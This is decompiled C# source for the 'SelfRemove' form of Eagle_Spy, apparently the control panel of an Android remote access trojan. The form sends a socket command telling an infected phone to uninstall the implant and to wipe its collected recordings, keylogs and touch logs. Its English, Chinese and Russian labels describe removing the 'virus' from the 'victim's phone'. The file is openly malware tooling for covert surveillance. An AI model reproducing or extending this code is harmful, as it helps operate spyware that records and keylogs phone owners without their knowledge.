using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x020000A4 RID: 164
	[DesignerGenerated]
	public partial class SelfRemove : Form
	{
		// Token: 0x0600088F RID: 2191 RVA: 0x00004C84 File Offset: 0x00002E84
		public SelfRemove()
		{
			base.Load += this.SelfRemove_Load;
			this.InitializeComponent();
		}

		// Token: 0x06000892 RID: 2194 RVA: 0x000D334C File Offset: 0x000D154C
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			TcpClient myClient = this.Classclient.myClient;
			string[] array = this.Classclient.Keys.Split(new char[] { ':' });
			int num = 0;
			int num2 = 0;
			string text = "";
			if (this.checkrecords.Checked)
			{
				text += "_RE_";
			}
			if (this.checkkeylogs.Checked)
			{
				text += "_FK_";
			}
			if (this.checktouch.Checked)
			{
				text += "_TH_";
			}
			object[] array2 = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"SFD<*>SLF",
					text,
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(num),
					Data.SPL_SOCKET,
					Conversions.ToString(num2),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(array2);
		}

		// Token: 0x06000893 RID: 2195 RVA: 0x00004CA4 File Offset: 0x00002EA4
		private void UpdateEnglish()
		{
			this.label3.Text = "After Self Destruct, Virus will be completely remove From victim's phone and you will not have access on this phone";
			this.DrakeUIButtonIcon1.Text = "UNINSTALL NOW";
		}

		// Token: 0x06000894 RID: 2196 RVA: 0x00004CC6 File Offset: 0x00002EC6
		private void UpdateChinese()
		{
			this.label3.Text = "自毁后，病毒将完全从受害者的手机中删除 您将无法访问此手机";
			this.DrakeUIButtonIcon1.Text = "立即卸载";
		}

		// Token: 0x06000895 RID: 2197 RVA: 0x00004CE8 File Offset: 0x00002EE8
		private void UpdateRussian()
		{
			this.label3.Text = "После самоуничтожения вирус будет полностью удален С телефона жертвы, и вы не будете иметь доступ к этому телефону";
			this.DrakeUIButtonIcon1.Text = "УНИНСТАЛЛИРОВАТЬ СЕЙЧАС";
		}

		// Token: 0x06000896 RID: 2198 RVA: 0x000D34BC File Offset: 0x000D16BC
		private void UpdateLanguage()
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Config", "Language.inf");
			if (File.Exists(text))
			{
				string text2 = File.ReadAllText(text);
				if (text2.Contains("English"))
				{
					this.UpdateEnglish();
					return;
				}
				if (text2.Contains("Russian"))
				{
					this.UpdateRussian();
					return;
				}
				if (text2.Contains("Chinese"))
				{
					this.UpdateChinese();
					return;
				}
				this.UpdateEnglish();
			}
		}

		// Token: 0x06000897 RID: 2199 RVA: 0x000D353C File Offset: 0x000D173C
		private void translateme()
		{
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "CN", false) != 0)
			{
				if (Operators.CompareString(language, "AR", false) == 0)
				{
					this.Label1.Text = Codes.Translate(this.Label1.Text, "en", "ar");
					this.Label2.Text = Codes.Translate(this.Label2.Text, "en", "ar");
					this.Label34.Text = Codes.Translate(this.Label34.Text, "en", "ar");
					return;
				}
			}
			else
			{
				this.Label1.Text = Codes.Translate(this.Label1.Text, "en", "zh");
				this.Label2.Text = Codes.Translate(this.Label2.Text, "en", "zh");
				this.Label34.Text = Codes.Translate(this.Label34.Text, "en", "zh");
			}
		}

		// Token: 0x06000898 RID: 2200 RVA: 0x00004D0A File Offset: 0x00002F0A
		private void SelfRemove_Load(object sender, EventArgs e)
		{
			this.clientpic.Image = this.Classclient.Wallpaper;
		}

		// Token: 0x06000899 RID: 2201 RVA: 0x00004D22 File Offset: 0x00002F22
		private void SelfRemove_Load_1(object sender, EventArgs e)
		{
			this.UpdateLanguage();
		}

		// Token: 0x04000A1B RID: 2587
		public Client Classclient;
	}
}
